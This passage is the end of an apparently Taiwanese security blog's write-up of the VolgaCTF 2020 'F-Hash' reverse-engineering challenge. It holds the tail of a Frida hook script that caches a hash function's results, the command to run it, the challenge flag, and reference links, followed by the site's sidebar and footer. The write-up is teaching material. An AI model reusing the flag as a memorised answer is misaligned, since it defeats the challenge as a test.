&#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            mem[<span class="variable language_">this</span>.<span class="property">hash</span>] = [<span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">readU64</span>()]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">2</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>最後執行 <code>frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash</code> 就可以了</p>
<h2 id="Flag">Flag</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;16011432ba16efc8dcf779477985b3b9&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash">https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash</a></li>
<li><a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">https://pastebin.com/Dj6wteXk</a></li>
<li><a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">https://sectt.github.io/writeups/Volga20/f-hash/README</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/05/04/f-hash/#more">Read more</a></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">Previous</a></div><div class="pagination-next"><a href="/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">資安研究員</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">47</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">區塊鍊</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">演算法</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A8%8B%E5%BC%8F/"><span class="level-start"><span class="level-item">程式</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">資安</span></span><span class="level-end"><span class="level-item tag">16</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-14T16:00:00.000Z">2022-12-15</time></p><p class="title"><a href="/2022/12/15/powershell-00/">【Powershell】WTF Powershell</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/11/12/flare-on-9/zh-tw/"><p align="center"><img data-src="/images/flare-on-9.png" class=" lazyload" alt="【Writeups】Flare-on 9"></p></a></figure><div class="media-content"><p class="date"><time dateTime="2022-11-11T16:00:00.000Z">2022-11-12</time></p><p class="title"><a href="/2022/11/12/flare-on-9/zh-tw/">【Writeups】Flare-on 9</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-08T16:00:00.000Z">2022-11-09</time></p><p class="title"><a href="/2022/11/09/cve-2022-41049/">【漏洞分析】CVE-2022-41049</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T16:00:00.000Z">2022-11-01</time></p><p class="title"><a href="/2022/11/01/MpDlpCmd/en/">【Windows Security】MpDlpCmd.exe</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-29T16:00:00.000Z">2022-03-30</time></p><p class="title"><a href="/2022/03/30/blog03/">【部落格開發日誌】0x03</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">May 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/04/"><span class="level-start"><span class="level-item">April 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">March 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">January 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/09/"><span class="level-start"><span class="level-item">September 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/08/"><span class="level-start"><span class="level-item">August 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/02/"><span class="level-start"><span class="level-item">February 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/GIL/"><span class="tag">GIL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/algorithm/"><span class="tag">algorithm</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blockchain/"><span class="tag">blockchain</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp/"><span class="tag">burp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command/"><span class="tag">command</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dapper-labs/"><span class="tag">dapper labs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/drony/"><span class="tag">drony</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare/"><span class="tag">flare</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare-on/"><span class="tag">flare-on</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flow/"><span class="tag">flow</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/frida/"><span class="tag">frida</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel/"><span class="tag">kernel</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nord/"><span class="tag">nord</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nox/"><span class="tag">nox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/osint/"><span class="tag">osint</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel10k/"><span class="tag">powerlevel10k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel9k/"><span class="tag">powerlevel9k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powershell/"><span class="tag">powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxy/"><span class="tag">proxy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pyc/"><span class="tag">pyc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-engineering/"><span class="tag">reverse engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-ssh/"><span class="tag">reverse ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rootkit/"><span class="tag">rootkit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rsa/"><span class="tag">rsa</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/seo/"><span class="tag">seo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/srop/"><span class="tag">srop</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tunnel/"><span class="tag">tunnel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows-defender/"><span class="tag">windows defender</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeups/"><span class="tag">writeups</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zimfw/"><span class="tag">zimfw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zsh/"><span class="tag">zsh</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">歐欸利恩的部落格</a><p class="is-size-7"><span>&copy; 2022 oalieno</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
                renderMathInElement(element);
            });
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>